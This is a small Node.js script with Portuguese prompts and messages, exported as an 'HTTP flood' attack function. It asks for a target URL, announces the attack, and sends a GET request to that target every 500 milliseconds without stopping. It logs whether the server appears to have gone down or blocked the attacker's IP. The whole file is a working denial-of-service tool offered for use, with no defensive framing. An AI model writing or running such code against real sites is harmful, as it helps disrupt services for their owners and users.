const axios = require("axios")
const time = 500
const readline = require("readline")

function perguntar(pergunta) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  return new Promise(resolve => {
    rl.question(pergunta, resposta => {
      rl.close();
      resolve(resposta);
    });
  });
}


async function httpfload(){
const  url = await perguntar("qual a url do alvo ?:");


console.log(`👿|iniciando ataque http fload em ${url}`)

setInterval(()=>{
axios.get(url)
.then(response =>{
console.log("[*] requisição feita com sucesso")

})

.catch(error =>{
console.log("[*] 💥 erro na requisição servidor provavelmnete caiu ou bloqueou seu ip")
console.log("\n erro:",error.message)

})

},time)

}

module.exports = httpfload